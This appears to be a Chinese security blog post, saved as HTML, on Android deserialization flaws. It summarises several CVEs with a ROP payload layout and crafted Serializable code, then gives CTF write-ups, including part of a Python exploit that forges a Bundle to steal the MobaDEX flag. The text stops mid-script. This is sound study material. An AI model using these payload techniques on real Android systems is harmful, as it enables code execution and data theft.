@@ -1,0 +1,800 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>Android反序列化相关 | </title>
+    <meta name="author" content="ssj">
+    
+    <meta name="description" content="上周HackTM CTF final的pwn中有一道Android题，是Android反序列化相关，感觉之前比较少见到很有意思，整理一下相关内容。
+Android Java Deserialization Vulnerability Tester是一个PoC；
+Android反序列化历史漏洞CVE-">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Android反序列化相关">
+    <meta property="og:site_name" content="ssj&#39;s blog">
+
+    
+    <meta property="og:image" content>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="ssj&#39;s blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tranquil-heart.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+</html>
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="pink accent-1">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">ssj&#39;s blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav pink darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="/pingtou.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">ssj</p>
+                        <p class="desc"></p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav pink darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/面试体验/">
+                    面试体验 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/面试体验/Android/">
+                    Android <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CTF/">
+                    CTF <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CTF/pwn/">
+                    pwn <span class="right">7</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CTF/Android/">
+                    Android <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Android/">
+                    Android <span class="right">15</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/脱壳/">
+                    脱壳 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/马甲包/">
+                    马甲包 <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Ethereum/">
+                    Ethereum <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Fuzz/">
+                    Fuzz <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CVE/">
+                    CVE <span class="right">11</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/二进制/">
+                    二进制 <span class="right">14</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/v8/">
+                    v8 <span class="right">7</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/Base/">
+                    Base <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/Kernel/">
+                    Kernel <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/vm/">
+                    vm <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/iOS/">
+                    iOS <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/二进制/Docs/">
+                    Docs <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/杂/">
+                    杂 <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/杂/定场诗/">
+                    定场诗 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/杂/听戏/">
+                    听戏 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/杂/京剧/">
+                    京剧 <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/基础知识/">
+                    基础知识 <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/基础知识/Cpp/">
+                    Cpp <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/算法/">
+                    算法 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper pink">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/Android/">Android</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Android反序列化相关</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2020-12-15T15:54:25.000Z"><a href="/2020/12/15/Android反序列化相关/">2020-12-15</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Android反序列化历史漏洞"><span class="section table-of-contents-text">Android反序列化历史漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2014-7911"><span class="section table-of-contents-text">CVE-2014-7911</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2015-3825"><span class="section table-of-contents-text">CVE-2015-3825</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2017-411-and-CVE-2017-412-Ashmem-race-conditions-in-MemoryIntArray"><span class="section table-of-contents-text">CVE-2017-411 and CVE-2017-412: Ashmem race conditions in MemoryIntArray</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#CVE-2017-0871-Not-so-arbitrary-Java-code-execution"><span class="section table-of-contents-text">CVE-2017-0871: Not so arbitrary Java code execution</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2020年两道相关的CTF题"><span class="section table-of-contents-text">2020年两道相关的CTF题</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2020-De1CTF-Pwn-BroadCastTest"><span class="section table-of-contents-text">2020-De1CTF-Pwn-BroadCastTest</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2020-HackTM-CTF-Final-–-MobaDEX"><span class="section table-of-contents-text">2020 HackTM CTF Final – MobaDEX</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <p>上周HackTM CTF final的pwn中有一道Android题，是Android反序列化相关，感觉之前比较少见到很有意思，整理一下相关内容。</p>
+<p><a href="https://github.com/modzero/modjoda">Android Java Deserialization Vulnerability Tester</a>是一个PoC；</p>
+<h2 id="Android反序列化历史漏洞"><a href="#Android反序列化历史漏洞" class="headerlink" title="Android反序列化历史漏洞"></a>Android反序列化历史漏洞</h2><h3 id="CVE-2014-7911"><a href="#CVE-2014-7911" class="headerlink" title="CVE-2014-7911"></a>CVE-2014-7911</h3><p><a href="http://rk700.github.io/2016/10/09/CVE-2014-7911/" target="_blank" rel="noopener">http://rk700.github.io/2016/10/09/CVE-2014-7911/</a></p>
+<ul>
+<li>通过控制Java对象中一个c++的指针来执行任意代码；</li>
+<li>找rop，堆喷，控制payload；</li>
+<li>触发漏洞，执行代码；</li>
+</ul>
+<p>精美payload如下：</p>
+<figure class="highlight plain"><figcaption><span>+---------+-------------------+---------------> payload start</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">          |      SA+GBO       |</span><br><span class="line">          |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |     SA+GBO-4      |      SAO</span><br><span class="line">Relative  |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">addresses |     SA+GBO-8      |</span><br><span class="line">          |                   |</span><br><span class="line">chunk     +-----------------------------------&gt; SA</span><br><span class="line">          |       ....        |</span><br><span class="line">          +-------------------+    GBO-SAO</span><br><span class="line">          |        1          |</span><br><span class="line">+-----------------------------+---------------&gt; SA+GBO-SAO = GBA</span><br><span class="line">          |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">Gadget    |        SA         |</span><br><span class="line">          +-------------------+</span><br><span class="line">Buffer    |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |    ROP chain 0    |</span><br><span class="line">+---------+-------------------+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一段Relative Addresses Chunk(RAC)是很长的一段，用于跳转到第二段；</li>
+<li>第二段Gadget Buffer(GB)则是用来放gadget的；</li>
+<li>SA指Static Address，即我们用来设置mOrgue的一个固定的地址；</li>
+<li>GBO指Gadget Buffer Offset，指的是GB在payload中的偏移量，也就是第一段的长度；</li>
+<li>SAO即Static Address Offset, 为SA相对于payload的偏移量；</li>
+</ul>
+<p>被修了，不能直接跨类型deserialization了。</p>
+<h3 id="CVE-2015-3825"><a href="#CVE-2015-3825" class="headerlink" title="CVE-2015-3825"></a>CVE-2015-3825</h3><p><a href="https://www.freebuf.com/vuls/115352.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115352.html</a></p>
+<p><a href="https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZpenSSLX509Certificate</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8550350185014308538L</span>; <span class="comment">//5.0</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> mContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZpenSSLX509Certificate</span><span class="params">(<span class="keyword">long</span> ctx)</span> </span>&#123;</span><br><span class="line">        mContext = ctx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Bundle b = <span class="keyword">new</span> Bundle();</span><br><span class="line">b.putSerializable(<span class="string">"eatthis"</span> , <span class="keyword">new</span> ZpenSSLX509Certificate(<span class="number">0xaaaaaaaaaL</span>));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>任意地址减一；</li>
+<li>任意地址写；</li>
+<li>通过其它进程读libcrypto.so的基址；</li>
+<li>覆盖libcrypto.so中id_callback函数的地址，控制执行流；</li>
+<li>执行gadget；</li>
+</ul>
+<h3 id="CVE-2017-411-and-CVE-2017-412-Ashmem-race-conditions-in-MemoryIntArray"><a href="#CVE-2017-411-and-CVE-2017-412-Ashmem-race-conditions-in-MemoryIntArray" class="headerlink" title="CVE-2017-411 and CVE-2017-412: Ashmem race conditions in MemoryIntArray"></a>CVE-2017-411 and CVE-2017-412: Ashmem race conditions in MemoryIntArray</h3><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1002" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1002</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">MemoryIntArray</span><span class="params">(Parcel parcel)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  mOwnerPid = parcel.readInt();</span><br><span class="line">  mClientWritable = (parcel.readInt() == <span class="number">1</span>);</span><br><span class="line">  ParcelFileDescriptor pfd = parcel.readParcelable(<span class="keyword">null</span>);</span><br><span class="line">  <span class="keyword">if</span> (pfd == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"No backing file descriptor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mFd = pfd.detachFd();</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">long</span> memoryAddress = parcel.readLong();</span><br><span class="line">  <span class="keyword">if</span> (isOwner()) &#123;</span><br><span class="line">    mMemoryAddr = memoryAddress;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mMemoryAddr = nativeOpen(mFd, <span class="keyword">false</span>, mClientWritable);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>攻击者可以控制<code>isOwner()</code>和<code>memoryAddress</code>。</p>
+<h3 id="CVE-2017-0871-Not-so-arbitrary-Java-code-execution"><a href="#CVE-2017-0871-Not-so-arbitrary-Java-code-execution" class="headerlink" title="CVE-2017-0871: Not so arbitrary Java code execution"></a>CVE-2017-0871: Not so arbitrary Java code execution</h3><p>As the serialization code in ParcelableException does enforce type checking on the Class that is written into the Parcel, an attacker still needs to modify the Parcel directly to exploit this vulnerability. However, this is not difficult and can be done in a similar way to Jann Horn’s PoC. In my PoC of this vulnerability, I call the constructor of FileOutputStream to truncate an arbitrary file as the system user.</p>
+<h2 id="2020年两道相关的CTF题"><a href="#2020年两道相关的CTF题" class="headerlink" title="2020年两道相关的CTF题"></a>2020年两道相关的CTF题</h2><h3 id="2020-De1CTF-Pwn-BroadCastTest"><a href="#2020-De1CTF-Pwn-BroadCastTest" class="headerlink" title="2020-De1CTF-Pwn-BroadCastTest"></a>2020-De1CTF-Pwn-BroadCastTest</h3><ol>
+<li><a href="https://www.anquanke.com/post/id/204393#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204393#h3-6</a></li>
+<li><a href="https://xz.aliyun.com/t/2364" target="_blank" rel="noopener">https://xz.aliyun.com/t/2364</a></li>
+</ol>
+<p>拆包封包不一致导致错位：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.txRate = in.readInt();</span><br><span class="line">dest.writeByte((<span class="keyword">byte</span>) <span class="keyword">this</span>.txRate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.rttSpread = in.readLong();</span><br><span class="line">dest.writeInt((<span class="keyword">int</span>) <span class="keyword">this</span>.rttSpread);</span><br></pre></td></tr></table></figure>
+<h3 id="2020-HackTM-CTF-Final-–-MobaDEX"><a href="#2020-HackTM-CTF-Final-–-MobaDEX" class="headerlink" title="2020 HackTM CTF Final – MobaDEX"></a>2020 HackTM CTF Final – MobaDEX</h3><p>有向任何人发送序列化数据的功能，我们可以完全控制payload让管理员调用getFlag把flag发送回来。</p>
+<p>exp（By Umut@r3kapig（Umut tql!））如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3 </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode </span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"> </span><br><span class="line">API_URL = <span class="string">"http://35.246.216.38:8686/api.php"</span> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(username,password)</span>:</span> </span><br><span class="line">    data = &#123; </span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"YOZ8AxBEUCgZEPG"</span>, </span><br><span class="line">    <span class="string">"username"</span>: username, </span><br><span class="line">        <span class="string">"password"</span>: password, </span><br><span class="line">    &#125; </span><br><span class="line">    res = requests.post(url=API_URL, data=data) </span><br><span class="line">    token = res.text </span><br><span class="line">    <span class="keyword">return</span> token </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_friend_token</span><span class="params">(friend_name, token)</span>:</span> </span><br><span class="line">    data = &#123; </span><br><span class="line">        <span class="string">"q"</span>: <span class="string">"KVY2ERbWMEGBgob"</span>,  </span><br><span class="line">        <span class="string">"token"</span>: token, </span><br><span class="line">        <span class="string">"friend_username"</span>: friend_name, </span><br><span class="line">    &#125; </span><br><span class="line">    res = requests.post(url=API_URL, data=data) </span><br><span class="line">    friend_token = res.text </span><br><span class="line">    <span class="keyword">return</span> friend_token </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_moba</span><span class="params">(my_token, friend_token, data)</span>:</span> </span><br><span class="line">    data = &#123; </span><br><span class="line">        <span class="string">"q"</span>: <span class="string">"6xP0R1sioF5knfv"</span>,  </span><br><span class="line">        <span class="string">"my_token"</span>: my_token, </span><br><span class="line">        <span class="string">"friend_token"</span>: friend_token, </span><br><span class="line">        <span class="string">"data"</span>: data, </span><br><span class="line">    &#125; </span><br><span class="line">    res = requests.post(url=API_URL, data=data) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_friend</span><span class="params">(token, username)</span>:</span> </span><br><span class="line">    data = &#123; </span><br><span class="line">        <span class="string">"q"</span>: <span class="string">"j0y2vm32GH6cfiP"</span>,  </span><br><span class="line">        <span class="string">"token"</span>: token, </span><br><span class="line">        <span class="string">"username"</span>: username, </span><br><span class="line">    &#125; </span><br><span class="line">    res = requests.post(url=API_URL, data=data) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_payload</span><span class="params">(user_token, friend_token)</span>:</span> </span><br><span class="line">    p = bytearray() </span><br><span class="line">    p += p32(<span class="number">0</span>) <span class="comment"># size </span></span><br><span class="line">    p += <span class="string">b'BNDL'</span> <span class="comment"># bundle magic </span></span><br><span class="line">    p += p32(<span class="number">6</span>) <span class="comment"># number of keys </span></span><br><span class="line">    p += p32(len(<span class="string">'moba_display_class'</span>)) <span class="comment"># key length </span></span><br><span class="line">    p += <span class="string">'moba_display_class\x00'</span>.encode(<span class="string">'utf-16le'</span>) <span class="comment"># key </span></span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) <span class="comment"># value type, 0 -&gt; string </span></span><br><span class="line">    p += p32(len(<span class="string">'com.example.mobadex.SendMoba'</span>)) <span class="comment"># value length </span></span><br><span class="line">    p += <span class="string">'com.example.mobadex.SendMoba\x00'</span>.encode(<span class="string">'utf-16le'</span>) <span class="comment"># value </span></span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    p += p32(len(<span class="string">'moba_display_content'</span>)) </span><br><span class="line">    p += <span class="string">'moba_display_content\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) </span><br><span class="line">    p += p32(len(<span class="string">'test'</span>)) </span><br><span class="line">    p += <span class="string">'umut\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    p += p32(len(<span class="string">'moba_display_package'</span>)) </span><br><span class="line">    p += <span class="string">'moba_display_package\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) </span><br><span class="line">    p += p32(len(<span class="string">'com.example.mobadex'</span>)) </span><br><span class="line">    p += <span class="string">'com.example.mobadex\x00'</span>.encode(<span class="string">'utf-16le'</span>)   </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    p += p32(len(<span class="string">'moba_data'</span>)) </span><br><span class="line">    p += <span class="string">'moba_data\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) </span><br><span class="line">    p += p32(len(<span class="string">'getFlag'</span>)) </span><br><span class="line">    p += <span class="string">'getFlag\x00'</span>.encode(<span class="string">'utf-16le'</span>)   </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    p += p32(len(<span class="string">'moba_user_token'</span>)) </span><br><span class="line">    p += <span class="string">'moba_user_token\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) </span><br><span class="line">    p += p32(len(user_token)) </span><br><span class="line">    p += <span 